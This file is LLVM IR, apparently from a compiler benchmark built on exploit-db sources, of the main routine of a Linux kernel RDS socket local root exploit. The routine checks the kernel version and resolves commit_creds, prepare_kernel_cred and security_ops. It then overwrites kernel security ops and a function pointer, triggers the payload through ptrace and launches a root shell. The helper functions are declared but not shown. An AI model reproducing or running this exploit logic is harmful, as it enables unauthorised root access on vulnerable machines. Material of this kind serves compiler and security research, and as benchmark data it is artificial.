; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15285.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_15285.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.utsname = type { i32 }

@.str = private unnamed_addr constant [47 x i8] c"[*] Linux kernel >= 2.6.30 RDS socket exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"[*] by Dan Rosenberg\0A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"2.6.3\00", align 1
@.str.3 = private unnamed_addr constant [36 x i8] c"[*] Your kernel is not vulnerable.\0A\00", align 1
@.str.4 = private unnamed_addr constant [35 x i8] c"[*] Resolving kernel addresses...\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"security_ops\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"default_security_ops\00", align 1
@.str.7 = private unnamed_addr constant [19 x i8] c"cap_ptrace_traceme\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.9 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [39 x i8] c"[*] Failed to resolve kernel symbols.\0A\00", align 1
@SENDPORT = common dso_local global i32 0, align 4
@RECVPORT = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [33 x i8] c"[*] Overwriting security ops...\0A\00", align 1
@.str.12 = private unnamed_addr constant [37 x i8] c"[*] Overwriting function pointer...\0A\00", align 1
@getroot = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [27 x i8] c"[*] Triggering payload...\0A\00", align 1
@PTRACE_TRACEME = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [35 x i8] c"[*] Restoring function pointer...\0A\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"[*] Exploit failed to get root.\0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"[*] Got root!\0A\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.utsname, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 @uname(%struct.utsname* %12)
  %16 = getelementptr inbounds %struct.utsname, %struct.utsname* %12, i32 0, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = call i64 @strncmp(i32 %17, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32 5)
  %19 = icmp ne i64 %18, 0
  br i1 %19, label %20, label %22

20:                                               ; preds = %2
  %21 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

22:                                               ; preds = %2
  %23 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  %24 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  store i64 %24, i64* %6, align 8
  %25 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  store i64 %25, i64* %7, align 8
  %26 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  store i64 %26, i64* %8, align 8
  %27 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0))
  store i64 %27, i64* @commit_creds, align 8
  %28 = call i64 @get_kernel_sym(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0))
  store i64 %28, i64* @prepare_kernel_cred, align 8
  %29 = load i64, i64* %6, align 8
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %43

31:                                               ; preds = %22
  %32 = load i64, i64* %7, align 8
  %33 = icmp ne i64 %32, 0
  br i1 %33, label %34, label %43

34:                                               ; preds = %31
  %35 = load i64, i64* %8, align 8
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %37, label %43

37:                                               ; preds = %34
  %38 = load i64, i64* @commit_creds, align 8
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %43

40:                                               ; preds = %37
  %41 = load i64, i64* @prepare_kernel_cred, align 8
  %42 = icmp ne i64 %41, 0
  br i1 %42, label %45, label %43

43:                                               ; preds = %40, %37, %34, %31, %22
  %44 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.10, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

45:                                               ; preds = %40
  %46 = load i64, i64* %7, align 8
  %47 = add i64 %46, 8
  %48 = add i64 %47, 16
  store i64 %48, i64* %9, align 8
  %49 = load i32, i32* @SENDPORT, align 4
  %50 = call i32 @prep_sock(i32 %49)
  store i32 %50, i32* %10, align 4
  %51 = load i32, i32* @RECVPORT, align 4
  %52 = call i32 @prep_sock(i32 %51)
  store i32 %52, i32* %11, align 4
  %53 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.11, i64 0, i64 0))
  %54 = load i64, i64* %6, align 8
  %55 = load i64, i64* %7, align 8
  %56 = load i32, i32* %10, align 4
  %57 = load i32, i32* %11, align 4
  %58 = call i32 @write_to_mem(i64 %54, i64 %55, i32 %56, i32 %57)
  %59 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.12, i64 0, i64 0))
  %60 = load i64, i64* %9, align 8
  %61 = load i32, i32* %10, align 4
  %62 = load i32, i32* %11, align 4
  %63 = call i32 @write_to_mem(i64 %60, i64 ptrtoint (i32* @getroot to i64), i32 %61, i32 %62)
  %64 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.13, i64 0, i64 0))
  %65 = load i32, i32* @PTRACE_TRACEME, align 4
  %66 = call i32 @ptrace(i32 %65, i32 1, i32* null, i32* null)
  %67 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.14, i64 0, i64 0))
  %68 = load i64, i64* %9, align 8
  %69 = load i64, i64* %8, align 8
  %70 = load i32, i32* %10, align 4
  %71 = load i32, i32* %11, align 4
  %72 = call i32 @write_to_mem(i64 %68, i64 %69, i32 %70, i32 %71)
  %73 = call i64 (...) @getuid()
  %74 = icmp ne i64 %73, 0
  br i1 %74, label %75, label %77

75:                                               ; preds = %45
  %76 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %80

77:                                               ; preds = %45
  %78 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i64 0, i64 0))
  %79 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0), i32* null)
  br label %80

80:                                               ; preds = %77, %75, %43, %20
  %81 = load i32, i32* %3, align 4
  ret i32 %81
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @uname(%struct.utsname*) #1

declare dso_local i64 @strncmp(i32, i8*, i32) #1

declare dso_local i64 @get_kernel_sym(i8*) #1

declare dso_local i32 @prep_sock(i32) #1

declare dso_local i32 @write_to_mem(i64, i64, i32, i32) #1

declare dso_local i32 @ptrace(i32, i32, i32*, i32*) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
